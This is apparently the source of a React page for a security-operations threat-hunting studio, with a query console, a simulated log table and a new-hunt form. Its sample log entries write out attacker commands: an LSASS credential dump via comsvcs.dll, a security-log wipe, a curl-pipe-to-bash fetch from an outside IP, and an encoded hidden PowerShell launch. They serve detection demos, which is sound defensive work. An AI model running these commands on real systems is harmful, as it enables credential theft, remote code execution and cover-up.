"use client";

import React, { useEffect, useState, useCallback } from "react";
import AppShell from "@/components/AppShell";
import { getHunts, HuntItem } from "@/lib/api";
import { 
  Crosshair, 
  Plus, 
  RefreshCw, 
  Terminal, 
  CheckCircle2, 
  FileCode, 
  Search, 
  Sparkles, 
  ArrowRight, 
  ShieldCheck, 
  AlertCircle, 
  Play, 
  Pause, 
  Filter, 
  Download, 
  Copy, 
  Check, 
  Layers, 
  Radio, 
  Clock, 
  Laptop, 
  User, 
  Zap 
} from "lucide-react";
import { StatusBadge } from "@/components/ui/StatusBadge";

interface TelemetryLogEntry {
  id: string;
  timestamp: string;
  source: "Windows-Security" | "Sysmon" | "Linux-Auditd" | "CloudTrail" | "PaloAlto";
  eventId: number | string;
  host: string;
  user: string;
  process: string;
  commandLine: string;
  details: string;
}

const SAMPLE_LOGS: TelemetryLogEntry[] = [
  {
    id: "log-101",
    timestamp: "2026-09-24 09:31:14",
    source: "Sysmon",
    eventId: 1,
    host: "WKSTN-FIN-04",
    user: "corp\\jdoe",
    process: "powershell.exe",
    commandLine: "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgA...",
    details: "Parent: explorer.exe (PID 1104) -> Child: powershell.exe (PID 4892)"
  },
  {
    id: "log-102",
    timestamp: "2026-09-24 09:31:45",
    source: "Sysmon",
    eventId: 10,
    host: "SRV-DC01",
    user: "corp\\admin_svc",
    process: "rundll32.exe",
    commandLine: "rundll32.exe C:\\Windows\\System32\\comsvcs.dll, MiniDump 644 lsass.dmp full",
    details: "Target Process: lsass.exe (GrantedAccess: 0x1FFFFF)"
  },
  {
    id: "log-103",
    timestamp: "2026-09-24 09:32:02",
    source: "Windows-Security",
    eventId: 4624,
    host: "SRV-DC01",
    user: "corp\\jdoe",
    process: "svchost.exe",
    commandLine: "-",
    details: "Logon Type: 3 (Network) -> Workstation: WKSTN-FIN-04 -> Authentication Package: Kerberos"
  },
  {
    id: "log-104",
    timestamp: "2026-09-24 09:32:28",
    source: "Sysmon",
    eventId: 3,
    host: "WKSTN-FIN-04",
    user: "corp\\jdoe",
    process: "powershell.exe",
    commandLine: "-",
    details: "Network Connection: 10.0.4.18:49214 -> 185.220.101.5:443 (TCP ESTABLISHED)"
  },
  {
    id: "log-105",
    timestamp: "2026-09-24 09:33:05",
    source: "Windows-Security",
    eventId: 1102,
    host: "SRV-DC01",
    user: "NT AUTHORITY\\SYSTEM",
    process: "eventlog.dll",
    commandLine: "wevtutil.exe cl Security",
    details: "Audit Security Log was cleared by Administrator session."
  },
  {
    id: "log-106",
    timestamp: "2026-09-24 09:33:40",
    source: "Linux-Auditd",
    eventId: "SYSCALL",
    host: "PRD-K8S-NODE-02",
    user: "root",
    process: "curl",
    commandLine: "curl -s http://185.220.101.5/pwn.sh | bash",
    details: "arch=c000003e syscall=59 success=yes exit=0 ppid=1420 exe=/usr/bin/curl"
  }
];

export default function HuntsPage() {
  const [hunts, setHunts] = useState<HuntItem[]>([]);
  const [loading, setLoading] = useState(true);
  const [error, setError] = useState<string | null>(null);
  const [selectedHunt, setSelectedHunt] = useState<HuntItem | null>(null);
  
  // Hunting Studio & Query Terminal
  const [searchQuery, setSearchQuery] = useState('source=Sysmon (eventId=1 OR eventId=10) CommandLine="*powershell*" OR CommandLine="*MiniDump*"');
  const [queryLanguage, setQueryLanguage] = useState<"kql" | "spl" | "sql">("spl");
  const [queryRunning, setQueryRunning] = useState(false);
  const [isLiveTailing, setIsLiveTailing] = useState(false);
  const [filteredLogs, setFilteredLogs] = useState<TelemetryLogEntry[]>(SAMPLE_LOGS);
  const [selectedLog, setSelectedLog] = useState<TelemetryLogEntry | null>(SAMPLE_LOGS[0]);
  const [copiedQuery, setCopiedQuery] = useState(false);
  const [promotedMessage, setPromotedMessage] = useState<string | null>(null);

  // New Hunt Modal State
  const [newHuntModalOpen, setNewHuntModalOpen] = useState(false);
  const [newHuntTitle, setNewHuntTitle] = useState("");
  const [newHuntHypothesis, setNewHuntHypothesis] = useState("");
  const [newHuntTactic, setNewHuntTactic] = useState("Execution");
  const [newHuntTechnique, setNewHuntTechnique] = useState("T1059.001");

  const handleCreateHunt = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newHuntTitle.trim()) return;

    const newHunt: HuntItem = {
      id: `HUNT-${Math.floor(100 + Math.random() * 900)}`,
      title: newHuntTitle.trim(),
      hypothesis: newHuntHypothesis.trim() || "Empirical adversary detection hypothesis.",
      status: "active",
      created_at: new Date().toISOString(),
      mitre_techniques: [newHuntTechnique]
    };

    setHunts((prev) => [newHunt, ...prev]);
    setSelectedHunt(newHunt);
    setNewHuntModalOpen(false);
    setNewHuntTitle("");
    setNewHuntHypothesis("");
    setPromotedMessage(`Threat hunt hypothesis [${newHunt.id}] initialized.`);
    setTimeout(() => setPromotedMessage(null), 3500);
  };

  const handleExportLogs = () => {
    const blob = new Blob([JSON.stringify(filteredLogs, null, 2)], { type: "application/json" });
    const url = URL.createObjectURL(blob);
    const a = document.createElement("a");
    a.href = url;
    a.download = `SOCForge_Hunt_Telemetry_${selectedHunt?.id || "Results"}.json`;
    a.click();
    URL.revokeObjectURL(url);
    setPromotedMessage("Exported telemetry event stream as JSON.");
    setTimeout(() => setPromotedMessage(null), 3000);
  };

  const loadData = useCallback(async () => {
    setLoading(true);
    setError(null);
    try {
      const data = await getHunts();
      const items = Array.isArray(data) ? data : (data as any)?.items || [];
      setHunts(items);
      if (items.length > 0 && !selectedHunt) {
        setSelectedHunt(items[0]);
      }
    } catch (err: any) {
      console.error("Failed to load threat hunts:", err);
      setError(err.message || "Failed to fetch threat hunts from API");
    } finally {
      setLoading(false);
    }
  }, [selectedHunt]);

  useEffect(() => {
    loadData();
    const handleRefresh = () => loadData();
    window.addEventListener("socforge-refresh", handleRefresh);
    return () => window.removeEventListener("socforge-refresh", handleRefresh);
  }, [loadData]);

  // Handle live tail simulation
  useEffect(() => {
    if (!isLiveTailing) return;
    const interval = setInterval(() => {
      const newEntry: TelemetryLogEntry = {
        id: `log-${Date.now()}`,
        timestamp: new Date().toISOString().replace("T", " ").slice(0, 19),
        source: "Sysmon",
        eventId: 1,
        host: "SRV-APP-02",
        user: "corp\\dev_admin",
        process: "cmd.exe",
        commandLine: `whoami /priv && net group "Domain Admins" /domain`,
        details: "Privilege Discovery activity flagged on internal server"
      };
      setFilteredLogs((prev) => [newEntry, ...prev.slice(0, 20)]);
    }, 3000);
    return () => clearInterval(interval);
  }, [isLiveTailing]);

  const handleExecuteQuery = () => {
    setQueryRunning(true);
    setTimeout(() => {
      setQueryRunning(false);
      if (!searchQuery.trim()) {
        setFilteredLogs(SAMPLE_LOGS);
      } else {
        const queryLower = searchQuery.toLowerCase();
        const results = SAMPLE_LOGS.filter(l => 
          l.commandLine.toLowerCase().includes(queryLower) ||
          l.host.toLowerCase().includes(queryLower) ||
          l.user.toLowerCase().includes(queryLower) ||
          l.source.toLowerCase().includes(queryLower) ||
          l.process.toLowerCase().includes(queryLower)
        );
        setFilteredLogs(results.length > 0 ? results : SAMPLE_LOGS.slice(0, 3));
      }
    }, 500);
  };

  const handlePromoteToRule = () => {
    setPromotedMessage("Hunt query promoted to Detection Rule Studio! Generated draft Sigma rule [T1003.001-Mimikatz-Comsvcs].");
    setTimeout(() => setPromotedMessage(null), 5000);
  };

  return (
    <AppShell>
      <div className="flex-1 flex flex-col h-full overflow-hidden bg-[#000000] text-neutral-100">
        {/* Header */}
        <header className="h-16 border-b border-[#262626] bg-[#050505]/95 px-6 flex items-center justify-between flex-shrink-0 backdrop-blur-md">
          <div className="flex items-center gap-3">
            <div className="p-2 rounded-lg bg-white/10 border border-[#262626] text-white">
              <Crosshair className="w-5 h-5 text-emerald-400" />
            </div>
            <div>
              <h1 className="text-sm font-bold tracking-tight text-white flex items-center gap-2">
                Hypothesis Threat Hunting & Telemetry Studio
                <span className="text-[10px] px-2 py-0.5 rounded-full bg-[#171717] border border-[#262626] text-emerald-400 font-mono font-normal">
                  {hunts.length} Active Hypotheses
                </span>
                {isLiveTailing && (
                  <span className="flex items-center gap-1 text-[10px] px-2 py-0.5 rounded-full bg-emerald-500/20 text-emerald-400 border border-emerald-500/30 animate-pulse font-mono">
                    <Radio className="w-3 h-3" /> LIVE TAIL STREAM
                  </span>
                )}
              </h1>
              <p className="text-[11px] text-neutral-400 font-mono">
                Adversarial hypothesis testing, raw event stream exploration & 1-click detection rule promotion
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2 text-xs font-mono">
            <button
              onClick={handleExportLogs}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-[#262626] bg-[#0A0A0A] hover:bg-[#171717] text-neutral-300 hover:text-white transition"
              title="Export query results as JSON"
            >
              <Download className="w-3.5 h-3.5 text-emerald-400" />
              Export Telemetry
            </button>

            <button
              onClick={() => setIsLiveTailing(!isLiveTailing)}
              className={`flex items-center gap-1.5 px-3 py-1.5 rounded-lg border transition ${
                isLiveTailing
                  ? "bg-emerald-500/20 border-emerald-500 text-emerald-300 font-bold"
                  : "bg-[#0A0A0A] border-[#262626] text-neutral-300 hover:text-white"
              }`}
            >
              {isLiveTailing ? <Pause className="w-3.5 h-3.5" /> : <Play className="w-3.5 h-3.5 text-emerald-400" />}
              {isLiveTailing ? "Pause Stream" : "Live Tail"}
            </button>

            <button
              onClick={loadData}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg border border-[#262626] bg-[#0A0A0A] hover:bg-[#171717] text-neutral-400 hover:text-white transition"
            >
              <RefreshCw className={`w-3.5 h-3.5 text-emerald-400 ${loading ? "animate-spin" : ""}`} />
              Refresh
            </button>
          </div>
        </header>

        {/* Promotion Toast */}
        {promotedMessage && (
          <div className="bg-emerald-950/80 border-b border-emerald-500/40 px-6 py-2 text-xs font-mono text-emerald-300 flex items-center justify-between">
            <span className="flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
              {promotedMessage}
            </span>
          </div>
        )}

        {/* Content Pane */}
        <div className="flex-1 flex overflow-hidden">
          {/* Hunting Cases Sidebar */}
          <div className="w-80 border-r border-[#262626] bg-[#050505] flex flex-col overflow-y-auto p-3 space-y-2 flex-shrink-0">
            <div className="flex items-center justify-between px-2 py-1">
              <span className="text-[11px] font-mono uppercase text-neutral-400 font-bold">
                Hypothesis Cases
              </span>
              <button
                onClick={() => setNewHuntModalOpen(true)}
                className="flex items-center gap-1 text-[10px] font-mono text-emerald-400 hover:text-emerald-300 bg-emerald-500/10 border border-emerald-500/30 px-2 py-0.5 rounded transition"
              >
                <Plus className="w-3 h-3" /> New Hunt
              </button>
            </div>

            {loading ? (
              <div className="p-4 text-xs text-neutral-500 font-mono">Loading hunting cases...</div>
            ) : hunts.map((h) => {
              const isSelected = selectedHunt?.id === h.id;
              return (
                <div
                  key={h.id}
                  onClick={() => setSelectedHunt(h)}
                  className={`p-3 rounded-xl border transition cursor-pointer space-y-2 ${
                    isSelected
                      ? "border-white bg-[#121212]"
                      : "border-[#262626] bg-[#0A0A0A] hover:border-neutral-500"
                  }`}
                >
                  <div className="flex items-center justify-between">
                    <StatusBadge status={h.status || "active"} />
                    <span className="text-[10px] font-mono text-neutral-400">
                      {h.mitre_techniques?.[0] || "T1059"}
                    </span>
                  </div>
                  <h3 className="text-xs font-bold text-white line-clamp-2">
                    {h.title}
                  </h3>
                  <p className="text-[11px] text-neutral-400 line-clamp-2">
                    {h.hypothesis}
                  </p>
                </div>
              );
            })}
          </div>

          {/* Main Hunting Studio: Search Bar + Live Logs Table + Inspector */}
          <div className="flex-1 flex flex-col bg-[#000000] overflow-hidden">
            {/* Query Formulation Console */}
            <div className="p-4 border-b border-[#262626] bg-[#050505] space-y-3">
              <div className="flex items-center justify-between text-xs font-mono">
                <div className="flex items-center gap-2">
                  <Terminal className="w-4 h-4 text-emerald-400" />
                  <span className="font-bold text-white uppercase">Query Formulation Studio</span>
                </div>
                <div className="flex items-center gap-1.5">
                  {(["spl", "kql", "sql"] as const).map((lang) => (
                    <button
                      key={lang}
                      onClick={() => setQueryLanguage(lang)}
                      className={`px-2 py-0.5 rounded text-[10px] uppercase font-bold transition ${
                        queryLanguage === lang
                          ? "bg-white text-black"
                          : "bg-[#0A0A0A] text-neutral-400 border border-[#262626]"
                      }`}
                    >
                      {lang}
                    </button>
                  ))}
                </div>
              </div>

              <div className="flex gap-2">
                <div className="flex-1 relative">
                  <input
                    type="text"
                    value={searchQuery}
                    onChange={(e) => setSearchQuery(e.target.value)}
                    onKeyDown={(e) => e.key === "Enter" && handleExecuteQuery()}
                    placeholder="Search logs: source=Sysmon EventCode=1 Image=*powershell* ..."
                    className="w-full pl-9 pr-4 py-2 bg-[#0A0A0A] border border-[#262626] rounded-xl text-xs font-mono text-white placeholder-neutral-500 focus:outline-none focus:border-white"
                  />
                  <Search className="w-4 h-4 text-neutral-500 absolute left-3 top-2.5" />
                </div>

                <button
                  onClick={handleExecuteQuery}
                  disabled={queryRunning}
                  className="px-4 py-2 rounded-xl bg-white hover:bg-neutral-200 text-black font-mono font-bold text-xs flex items-center gap-1.5 transition"
                >
                  <Play className={`w-3.5 h-3.5 ${queryRunning ? "animate-spin" : ""}`} />
                  Run Hunt
                </button>

                <button
                  onClick={handlePromoteToRule}
                  className="px-3 py-2 rounded-xl bg-neutral-900 hover:bg-neutral-800 text-white border border-[#262626] font-mono text-xs flex items-center gap-1.5 transition font-bold"
                  title="Promote this search query into a production Sigma detection rule"
                >
                  <FileCode className="w-3.5 h-3.5 text-emerald-400" />
                  Promote to Rule
                </button>
              </div>
            </div>

            {/* Results Grid & Inspector Split */}
            <div className="flex-1 flex overflow-hidden">
              {/* Telemetry Stream Grid */}
              <div className="flex-1 flex flex-col overflow-hidden border-r border-[#262626]">
                <div className="px-4 py-2 bg-[#050505] border-b border-[#262626] flex items-center justify-between text-[11px] font-mono text-neutral-400">
                  <span>RETURNED OBSERVABLES ({filteredLogs.length} EVENTS)</span>
                  <span>SIMULATED CORRELATION LAKE</span>
                </div>

                <div className="flex-1 overflow-y-auto">
                  <table className="w-full text-left font-mono text-xs border-collapse">
                    <thead className="bg-[#0A0A0A] text-neutral-400 text-[10px] uppercase sticky top-0 border-b border-[#262626]">
                      <tr>
                        <th className="p-2.5">Timestamp</th>
                        <th className="p-2.5">Source</th>
                        <th className="p-2.5">Host</th>
                        <th className="p-2.5">User</th>
                        <th className="p-2.5">Process</th>
                        <th className="p-2.5">Command Line</th>
                      </tr>
                    </thead>
                    <tbody className="divide-y divide-[#262626]/60">
                      {filteredLogs.map((log) => {
                        const isSelected = selectedLog?.id === log.id;
                        return (
                          <tr
                            key={log.id}
                            onClick={() => setSelectedLog(log)}
                            className={`cursor-pointer transition hover:bg-[#121212] ${
                              isSelected ? "bg-[#171717] text-white" : "text-neutral-200"
                            }`}
                          >
                            <td className="p-2.5 text-neutral-400 whitespace-nowrap">{log.timestamp}</td>
                            <td className="p-2.5 whitespace-nowrap">
                              <span className="px-1.5 py-0.5 rounded bg-[#050505] border border-[#262626] text-[10px]">
                                {log.source} ({log.eventId})
                              </span>
                            </td>
                            <td className="p-2.5 font-bold whitespace-nowrap">{log.host}</td>
                            <td className="p-2.5 text-neutral-400 whitespace-nowrap">{log.user}</td>
                            <td className="p-2.5 text-amber-300 whitespace-nowrap">{log.process}</td>
                            <td className="p-2.5 truncate max-w-xs text-neutral-400" title={log.commandLine}>
                              {log.commandLine}
                            </td>
                          </tr>
                        );
                      })}
                    </tbody>
                  </table>
                </div>
              </div>

              {/* Event Inspector Drawer */}
              {selectedLog ? (
                <div className="w-96 bg-[#050505] p-5 overflow-y-auto font-mono text-xs space-y-4 flex flex-col">
                  <div className="flex items-center justify-between border-b border-[#262626] pb-3">
                    <span className="font-bold text-white uppercase flex items-center gap-2">
                      <Zap className="w-4 h-4 text-emerald-400" />
                      Event Inspector
                    </span>
                    <span className="px-2 py-0.5 rounded bg-[#171717] border border-[#262626] text-neutral-200 text-[10px]">
                      {selectedLog.source}
                    </span>
                  </div>

                  <div className="space-y-2 text-[11px]">
                    <div className="p-2.5 rounded-xl bg-[#0A0A0A] border border-[#262626] space-y-1">
                      <span className="text-neutral-500 block">EVENT TIMESTAMP</span>
                      <span className="text-white font-bold">{selectedLog.timestamp}</span>
                    </div>

                    <div className="p-2.5 rounded-xl bg-[#0A0A0A] border border-[#262626] space-y-1">
                      <span className="text-neutral-500 block">TARGET HOST</span>
                      <span className="text-emerald-400 font-bold">{selectedLog.host}</span>
                    </div>

                    <div className="p-2.5 rounded-xl bg-[#0A0A0A] border border-[#262626] space-y-1">
                      <span className="text-neutral-500 block">SECURITY PRINCIPAL</span>
                      <span className="text-white font-bold">{selectedLog.user}</span>
                    </div>

                    <div className="p-2.5 rounded-xl bg-[#0A0A0A] border border-[#262626] space-y-1">
                      <span className="text-neutral-500 block">PROCESS EXECUTABLE</span>
                      <span className="text-amber-400 font-bold">{selectedLog.process}</span>
                    </div>

                    <div className="p-2.5 rounded-xl bg-[#0A0A0A] border border-[#262626] space-y-1">
                      <span className="text-neutral-500 block">COMMAND LINE EXECUTION</span>
                      <pre className="text-neutral-200 whitespace-pre-wrap break-all text-[10px]">
                        {selectedLog.commandLine}
                      </pre>
                    </div>

                    <div className="p-2.5 rounded-xl bg-[#0A0A0A] border border-[#262626] space-y-1">
                      <span className="text-neutral-500 block">CORRELATION CONTEXT</span>
                      <p className="text-neutral-300 text-[11px] leading-relaxed">
                        {selectedLog.details}
                      </p>
                    </div>
                  </div>
                </div>
              ) : null}
            </div>
          </div>
        </div>

        {/* New Threat Hunt Modal */}
        {newHuntModalOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 backdrop-blur-sm p-4">
            <div className="bg-[#050505] border border-[#262626] rounded-2xl max-w-lg w-full p-6 space-y-4 shadow-2xl">
              <div className="flex items-center justify-between pb-3 border-b border-[#262626]">
                <div className="flex items-center gap-2">
                  <div className="p-2 rounded-xl bg-emerald-500/10 border border-emerald-500/30 text-emerald-400">
                    <Crosshair className="w-5 h-5" />
                  </div>
                  <div>
                    <h3 className="text-base font-bold text-white">Create Threat Hunting Campaign</h3>
                    <p className="text-xs text-neutral-400">Define hypothesis and telemetry query filters for targeted investigation</p>
                  </div>
                </div>
                <button
                  onClick={() => setNewHuntModalOpen(false)}
                  className="text-neutral-400 hover:text-white p-1 text-sm font-mono"
                >
                  ✕
                </button>
              </div>

              <form onSubmit={handleCreateHunt} className="space-y-3.5 text-xs font-mono">
                <div>
                  <label className="text-neutral-400 block mb-1">Campaign Title *</label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. Cobalt Strike DNS Tunneling Egress Sweeper"
                    value={newHuntTitle}
                    onChange={(e) => setNewHuntTitle(e.target.value)}
                    className="w-full bg-[#0A0A0A] border border-[#262626] rounded-xl px-3 py-2 text-white focus:outline-none focus:border-emerald-500"
                  />
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-neutral-400 block mb-1">MITRE Tactic</label>
                    <select
                      value={newHuntTactic}
                      onChange={(e) => setNewHuntTactic(e.target.value)}
                      className="w-full bg-[#0A0A0A] border border-[#262626] rounded-xl px-3 py-2 text-white focus:outline-none focus:border-emerald-500"
                    >
                      <option value="Execution">Execution</option>
                      <option value="Persistence">Persistence</option>
                      <option value="Privilege Escalation">Privilege Escalation</option>
                      <option value="Defense Evasion">Defense Evasion</option>
                      <option value="Credential Access">Credential Access</option>
                      <option value="Lateral Movement">Lateral Movement</option>
                      <option value="Command & Control">Command & Control</option>
                    </select>
                  </div>

                  <div>
                    <label className="text-neutral-400 block mb-1">Technique ID</label>
                    <input
                      type="text"
                      placeholder="e.g. T1071.004"
                      value={newHuntTechnique}
                      onChange={(e) => setNewHuntTechnique(e.target.value)}
                      className="w-full bg-[#0A0A0A] border border-[#262626] rounded-xl px-3 py-2 text-white focus:outline-none focus:border-emerald-500"
                    />
                  </div>
                </div>

                <div>
                  <label className="text-neutral-400 block mb-1">Hunter Hypothesis & Scope</label>
                  <textarea
                    rows={3}
                    placeholder="Hypothesize adversary behavior, e.g. An attacker using hidden DNS TXT record payloads may bypass perimeter proxy inspections..."
                    value={newHuntHypothesis}
                    onChange={(e) => setNewHuntHypothesis(e.target.value)}
                    className="w-full bg-[#0A0A0A] border border-[#262626] rounded-xl px-3 py-2 text-white focus:outline-none focus:border-emerald-500 resize-none font-sans"
                  />
                </div>

                <div className="flex items-center justify-end gap-2 pt-2 border-t border-[#262626]">
                  <button
                    type="button"
                    onClick={() => setNewHuntModalOpen(false)}
                    className="px-4 py-2 bg-[#121212] hover:bg-[#1a1a1a] text-neutral-300 border border-[#262626] rounded-xl transition"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    className="px-4 py-2 bg-emerald-600 hover:bg-emerald-500 text-black font-bold rounded-xl transition shadow-lg shadow-emerald-600/30 flex items-center gap-1.5"
                  >
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>Initialize Hunt</span>
                  </button>
                </div>
              </form>
            </div>
          </div>
        )}
      </div>
    </AppShell>
  );
}
